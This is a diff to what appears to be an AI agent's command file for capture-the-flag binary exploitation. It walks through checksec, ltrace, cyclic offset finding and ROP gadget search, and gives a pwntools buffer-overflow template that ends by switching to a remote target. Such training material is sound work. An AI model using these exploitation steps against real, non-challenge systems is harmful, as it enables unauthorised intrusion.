@@ -32,7 +32,13 @@ Use this command for challenges involving:
 
 ## Instructions
 
-1. First check tool availability: `bash scripts/check-tools.sh`
+1. Check tool availability:
+
+   ```bash
+   bash scripts/check-tools.sh
+   ```
+
+   Expected: each tool prints `[OK]`. If any show `[MISSING]`, note which are unavailable before proceeding.
 
 2. Run the pwn analysis:
 
@@ -40,58 +46,84 @@ Use this command for challenges involving:
    ctf run pwn $ARGUMENTS
    ```
 
-2. Check binary protections:
+   Expected output: binary type, architecture, and initial observations.
+
+3. **CRITICAL: Check binary protections before attempting any exploit:**
 
    ```bash
    checksec ./binary
    ```
 
-   | Protection | If Disabled |
-   |------------|-------------|
-   | CANARY | Stack overflow exploitable |
-   | NX | Shellcode injection possible |
-   | PIE | Fixed addresses for ROP |
-   | RELRO | GOT overwrite possible |
-
-3. Find ROP gadgets:
-
-   ```bash
-   # Find all gadgets
-   ROPgadget --binary ./binary
-
-   # Find specific gadgets
-   ROPgadget --binary ./binary --re "pop rdi"
-
-   # For x64: need pop rdi; ret for first argument
-   # For x86: arguments on stack
+   Expected output:
+   ```
+   Arch:     amd64-64-little
+   RELRO:    Partial RELRO
+   Stack:    No canary found
+   NX:       NX enabled
+   PIE:      No PIE
    ```
 
-4. Dynamic analysis:
+   **Read the output carefully — your exploit strategy depends on it:**
+
+   | Protection | If Disabled | Exploit path |
+   |------------|-------------|--------------|
+   | CANARY | `No canary found` | Stack overflow directly exploitable |
+   | NX | `NX disabled` | Inject and execute shellcode on stack |
+   | PIE | `No PIE` | Use fixed addresses for ROP gadgets |
+   | RELRO | `Partial RELRO` | GOT overwrite possible |
+
+   **CRITICAL: If all protections are enabled, this is a harder challenge — consider heap exploitation or format string attacks instead of stack overflow.**
+
+4. Run the binary and observe behavior:
 
    ```bash
-   # Run binary
    ./binary
-
-   # Trace library calls
-   ltrace ./binary
-
-   # Trace system calls
-   strace ./binary
-
-   # Debug with GDB
-   gdb ./binary
    ```
 
-5. Find offset to return address:
+   Expected: interactive prompt asking for input. Note what input it expects. Then trace calls:
+
+   ```bash
+   ltrace ./binary <<< "AAAA"
+   ```
+
+   Expected: library calls like `gets(...)`, `strcmp(...)`, `printf(...)`. Functions like `gets` or `scanf("%s")` indicate buffer overflow. `printf(user_input)` indicates format string vulnerability.
+
+5. Find the offset to the return address:
 
    ```python
-   # Generate pattern
    from pwn import *
    print(cyclic(200))
-
-   # Find offset after crash
-   cyclic_find(0x61616161)  # Replace with crash value
    ```
+
+   Feed the cyclic pattern to the binary. After crash, find offset:
+
+   ```python
+   cyclic_find(0x61616161)  # Replace with value from crash/core dump
+   ```
+
+   Expected: integer offset (e.g., `72`) — this is the padding needed before the return address.
+
+6. Find ROP gadgets (if NX is enabled):
+
+   ```bash
+   ROPgadget --binary ./binary --re "pop rdi"
+   ```
+
+   Expected: `0x00401234 : pop rdi ; ret` — note the address for building the ROP chain.
+
+   For x64: need `pop rdi; ret` for first argument. For x86: arguments go on the stack.
+
+7. **Validation: Test exploit locally before targeting remote.**
+
+   ```python
+   from pwn import *
+   p = process('./binary')
+   payload = b'A' * offset + p64(target_address)
+   p.sendline(payload)
+   p.interactive()
+   ```
+
+   Expected: shell prompt or flag output. If it crashes, revisit steps 3-6 — the offset or target address may be wrong. Once working locally, switch to `remote(host, port)`.
 
 ## Common Attack Patterns
 
